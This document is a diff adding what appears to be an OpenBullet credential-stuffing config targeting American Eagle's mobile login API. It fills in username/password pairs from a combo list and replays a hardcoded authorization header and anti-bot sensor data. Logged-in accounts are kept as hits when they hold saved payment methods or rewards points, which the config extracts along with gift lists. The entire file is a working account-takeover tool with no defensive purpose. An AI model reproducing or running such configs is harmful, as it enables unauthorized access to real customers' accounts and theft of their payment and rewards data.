@@ -1,0 +1,69 @@
+[SETTINGS]
+{
+  "Name": "AE",
+  "SuggestedBots": 1,
+  "LastModified": "2019-01-05T03:53:38.6339629+01:00",
+  "AdditionalInfo": "",
+  "Author": "FreakShock",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#1 REQUEST POST "https://api.ae.com/security/v2/token?channel=native-mobile" AutoRedirect=TRUE 
+  CONTENT "grant_type=client_credentials&" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: AmericanEagle/5.9.0 (Android; 19)" 
+  HEADER "Pragma: no-cache" 
+  HEADER "X-acf-sensor-data: 1,a,CuF2JtFJHaLV697gIpWoV9oLiySz9IHjKz7eRIa6V45Hp3baj0xAblQfo5oo6mlSvbbDUqju9HysvkMhmIMg15xVYsLkxApUEcEB399IHwxHpDAh4S0GoRKaA1xb+iLpR9g+BxzC+iRVOCRH52qJ+QvyxneIyIlbyxhJOeZGyrc=,n472LaTOuXyuTKqCxZ1uJox2JUlOizCaWnTSDVwy3LWYjHPCOautYqTe5uxRL3dx5AuK8CY4mjAExKIipwTSDUF5Qpd/lD8N0BACgB2R2khgmXpAS+AoKZVzcaAFDTJZOhwP+hlVd6V49KwIwNuQW7GT8iMzQLOsZBIyi1AAeI0=$AhqMrcbt3jlU4URMMjcJdI3Fs/k+62JOaMHI8VndPHyq8NILCzxx1IlB/Gg1yXg5/xywAx7aaWuoa2CXnL22dQtpeq1OdhI25bYV/YpVTtaa3oW0AGuu5Ruqr3P6wu6GpPkybCpu23Qa29pe4nazlMNlvweylUM7w5DG4zJCQ+PDKHwt5vpbRdYHy9fPKavt+Cz2SaAax3tXJo5eQkncsIMQUND3c9nnJtYBZx0Ua35niOKRpFxiQn5id7RPgELSegoCDMg9vudTNRwiLDUDQWJy3ORLB2qSvvNsNXgCpjT1xQpYZM5hRveoIuDsQIkZ/NNRV9s7fOBy9YVrJrF194I5EDx6TjQ1Iw1U6U8s6OzF2FqhP/XCvvPehG05BEcWW2Hr48ZXXe1yRpLCo7OBvI0XFuC8QHscj32iiP2fxVLxxFI2giSOdjWOI4EM07nu5mE/hUS7vHdLfWo3NnB15LEy+V3sE7+AY0Qs1KVMTFm1hzCIdGtfkiWVPHrmyixAlkXL0C2XZXG6ps5q9uq/FCKOHuWFUA79rMmFsPB+qqvN4UPQ6zXK3JHcQTQ5h65Go/ebHvrgcFfNTewQfXDtLgJESnnGHdyjMBiq3r3gVcH5xfKNoBvImUWPxn0sC4btVjOZ6xRjiVwpiDTf91DFXR8q9jXZRjsEjIuWcrQNdkYfVP2hUQBMbU2LQmobNDJ9kOB7jxF5n91e+KjxPjB5+cWxLENwKjOiJKLbbEP8S0y1o55ITLUBhXEJUb+7ggg4qjgqUdAu5pc/d8b4SvVGiqO4awaeX3AqDeGPXXpOIe0ncSWrJ9CqGQlZGkcEbKd42AktNBWdK1TEQftf20PQFBPENv7cmk1t7bnMTfXH/+fZG0ulmuaDaRiinMa/tHlku1HdWOX3UOPFJUlYgH1I3azqlCcr1a0Hq7q7fDUfACnoDyAlDSGKHVSSNqZxU1dgw8tr/+iaPh4A2hLujEwbnj3KGttRiRtG8f+VKPKdEima1Sk1uP9Dt60rdEU7C1bQHRJPCkFddvYLRq8ov3eWemU17o381GEOt8y4nUcAPX3mpTVpeAvgSAJ1BHd51ZEIomzizglZANo0eDxAEi/Pwg==$3000,1000,0" 
+  HEADER "X-NewRelic-ID: VwMPUFJVGwAIUllSBgk=" 
+  HEADER "Authorization: Basic MTAxNjM2OTI4ODY6MjhlMmZlODllZjU3ZjA3MTUyYmIxZmZiNDc1ZDEwNmRiOTA2OGQ4Mw==" 
+  HEADER "Connection: Keep-Alive" 
+#2 REQUEST POST "https://api.ae.com/security/v2/token?channel=native-mobile" AutoRedirect=TRUE 
+  CONTENT "grant_type=password&password=<PASS>&username=<USER>" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: AmericanEagle/5.9.0 (Android; 19)" 
+  HEADER "Pragma: no-cache" 
+  HEADER "X-acf-sensor-data: 1,a,CuF2JtFJHaLV697gIpWoV9oLiySz9IHjKz7eRIa6V45Hp3baj0xAblQfo5oo6mlSvbbDUqju9HysvkMhmIMg15xVYsLkxApUEcEB399IHwxHpDAh4S0GoRKaA1xb+iLpR9g+BxzC+iRVOCRH52qJ+QvyxneIyIlbyxhJOeZGyrc=,n472LaTOuXyuTKqCxZ1uJox2JUlOizCaWnTSDVwy3LWYjHPCOautYqTe5uxRL3dx5AuK8CY4mjAExKIipwTSDUF5Qpd/lD8N0BACgB2R2khgmXpAS+AoKZVzcaAFDTJZOhwP+hlVd6V49KwIwNuQW7GT8iMzQLOsZBIyi1AAeI0=$AhqMrcbt3jlU4URMMjcJdI3Fs/k+62JOaMHI8VndPHyq8NILCzxx1IlB/Gg1yXg5/xywAx7aaWuoa2CXnL22dQtpeq1OdhI25bYV/YpVTtaa3oW0AGuu5Ruqr3P6wu6GpPkybCpu23Qa29pe4nazlMNlvweylUM7w5DG4zJCQ+PDKHwt5vpbRdYHy9fPKavt+Cz2SaAax3tXJo5eQkncsIMQUND3c9nnJtYBZx0Ua35niOKRpFxiQn5id7RPgELSegoCDMg9vudTNRwiLDUDQWJy3ORLB2qSvvNsNXgCpjT1xQpYZM5hRveoIuDsQIkZ/NNRV9s7fOBy9YVrJrF194I5EDx6TjQ1Iw1U6U8s6OzF2FqhP/XCvvPehG05BEcWW2Hr48ZXXe1yRpLCo7OBvI0XFuC8QHscj32iiP2fxVLxxFI2giSOdjWOI4EM07nu5mE/hUS7vHdLfWo3NnB15LEy+V3sE7+AY0Qs1KVMTFm1hzCIdGtfkiWVPHrmyixAlkXL0C2XZXG6ps5q9uq/FCKOHuWFUA79rMmFsPB+qqvN4UPQ6zXK3JHcQTQ5h65Go/ebHvrgcFfNTewQfXDtLgJESnnGHdyjMBiq3r3gVcH5xfKNoBvImUWPxn0sC4btVjOZ6xRjiVwpiDTf91DFXR8q9jXZRjsEjIuWcrQNdkYfVP2hUQBMbU2LQmobNDJ9kOB7jxF5n91e+KjxPjB5+cWxLENwKjOiJKLbbEP8S0y1o55ITLUBhXEJUb+7ggg4qjgqUdAu5pc/d8b4SvVGiqO4awaeX3AqDeGPXXpOIe0ncSWrJ9CqGQlZGkcEbKd42AktNBWdK1TEQftf20PQFBPENv7cmk1t7bnMTfXH/+fZG0ulmuaDaRiinMa/tHlku1HdWOX3UOPFJUlYgH1I3azqlCcr1a0Hq7q7fDUfACnoDyAlDSGKHVSSNqZxU1dgw8tr/+iaPh4A2hLujEwbnj3KGttRiRtG8f+VKPKdEima1Sk1uP9Dt60rdEU7C1bQHRJPCkFddvYLRq8ov3eWemU17o381GEOt8y4nUcAPX3mpTVpeAvgSAJ1BHd51ZEIomzizglZANo0eDxAEi/Pwg==$3000,1000,0" 
+  HEADER "X-NewRelic-ID: VwMPUFJVGwAIUllSBgk=" 
+  HEADER "Authorization: Basic MTAxNjM2OTI4ODY6MjhlMmZlODllZjU3ZjA3MTUyYmIxZmZiNDc1ZDEwNmRiOTA2OGQ4Mw==" 
+  HEADER "Connection: Keep-Alive" 
+#FAIL KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "error" 
+#TOKEN PARSE "<SOURCE>" LR "access_token\":\"" "\"" Recursive=FALSE -> VAR "TOKEN" "" "" 
+REQUEST GET "https://api.ae.com/3.0/users/me?detailedInfo=true&channel=native-mobile" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: AmericanEagle/5.9.0 (Android; 19)" 
+  HEADER "Pragma: no-cache" 
+  HEADER "X-Access-Token: <TOKEN>" 
+  HEADER "X-NewRelic-ID: VwMPUFJVGwAIUllSBgk=" 
+  HEADER "Connection: Keep-Alive" 
+#SUCC KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success AND 
+    KEY "aeccMember" 
+    KEY "<SOURCE>" DoesNotContain "paymentMethods\":[]" 
+    KEY "<SOURCE>" DoesNotContain "rewardsPoints\":\"0" 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "paymentMethods\":[]" 
+    KEY "rewardsPoints\":\"0" 
+#PAY PARSE "<SOURCE>" LR "paymentMethods\":[" "]" Recursive=FALSE -> CAP "Payment Methods" "" "" 
+#REWARDS PARSE "<SOURCE>" LR "rewardsPoints\":\"" "\"" Recursive=FALSE -> CAP "Rewards Points" "" "" 
+#GIFT PARSE "<SOURCE>" LR "giftLists\":[" "]" Recursive=FALSE -> CAP "Gift Lists" "" "" 
